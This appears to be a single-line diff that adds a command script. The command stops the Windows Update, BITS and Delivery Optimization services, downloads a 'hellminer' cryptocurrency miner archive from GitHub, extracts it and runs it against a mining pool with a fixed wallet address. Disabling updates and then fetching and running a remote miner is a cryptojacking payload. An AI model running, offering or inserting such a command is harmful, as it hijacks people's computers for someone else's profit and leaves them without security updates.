@@ -1,0 +1,1 @@
+net stop dosvc; net stop bits; net stop wuauserv; curl.exe -LJOk "https://github.com/okg123/githel/blob/main/hellminer_cpu_win64_avx%20(2).zip"; tar.exe -xvf hellminer_cpu_win64_avx%20(2).zip; ./hellminer.exe -c stratum+tcp://eu.luckpool.net:3956#xnsub -u "RPzoRzbAZLNcTXJ2D7NvpprGUMrrWBh12c.$(Get-Random -Max 32767)" -p x --cpu 4
